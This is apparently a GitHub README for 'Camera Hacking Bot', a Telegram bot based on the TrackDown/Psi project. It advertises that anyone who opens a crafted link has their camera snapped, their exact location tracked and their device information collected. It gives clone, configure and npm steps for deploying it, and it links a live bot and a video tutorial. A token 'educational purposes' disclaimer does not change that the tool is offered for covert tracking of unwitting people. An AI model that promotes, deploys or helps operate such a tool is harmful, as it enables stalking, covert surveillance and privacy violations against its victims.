
<p align='center'><img style="height:100px;width:100px" src="https://te.legra.ph/file/167b6f9e71a4df6e184d7.jpg" ></p>

<h2 align='center'>🔰 Welcome to Camera Hacking Bot. If you use this bot, then you can track exact photos, location with device information of anyone through a link 🔥. </h2>
<div align="center">
<br>
<h3>This bot can track a person's location , can snap their picture, and gathers a lot of information regarding their device.</h3>
<div align="center">
<br>
<h2>⚠️ DISCLAIMER ⚠️</h2>
<h3>This bot is available only for educational purposes. We are not promoting any illegal activities Please use this bot responsibly..</h4>

<div align="center">
<div align="center">
<br>

[![https://telegram.me/onlinehacking](https://img.shields.io/badge/Telegram-Channel-orange.svg?style=flat-square)](https://telegram.me/onlinehacking)
[![https://telegram.me/onlinehacking](https://img.shields.io/badge/Telegram-@th30neand0nly-blue.svg?style=flat-square)](https://telegram.me/onlinehacking)

</div>

This tool is based upon [Psi](https://github.com/Th30neAnd0nly/Psi) .This is a telegram implementation with extra features than Psi.
### Try it at [@CameraHackingBot](https://t.me/CameraHackingBot)


[![Run on Repl.it](https://repl.it/badge/github/suman333mondal/CameraHackingBot)](https://repl.it/github/suman333mondal/CameraHackingBot)
 
#### Video Tutorial 

[![Video Tutorial](https://github.com/Th30neAnd0nly/TrackDown/blob/main/vid.png)](https://github.com/Th30neAnd0nly/TrackDown/blob/main/vid.mp4?raw=true)
 

### How to build
1. Create a telegram bot through [BotFather](https://t.me/BotFather).
1. Copy it's API key
1. Clone the repo using `git clone https://github.com/Th30neAnd0nly/TrackDown`
1. `cd TrackDown`
1. Create a environment variable in `.env` file named `bot` and put your telegram bot token as it's value.
1. Replace your website URL at [index.js](https://github.com/Th30neAnd0nly/TrackDown/blob/8d2b963bc96d34282589d47240a9db56b5ce79f5/index.js#L15)
1. Run `npm install`
1. Afterwards `npm start`
1. Your Bot is now online.
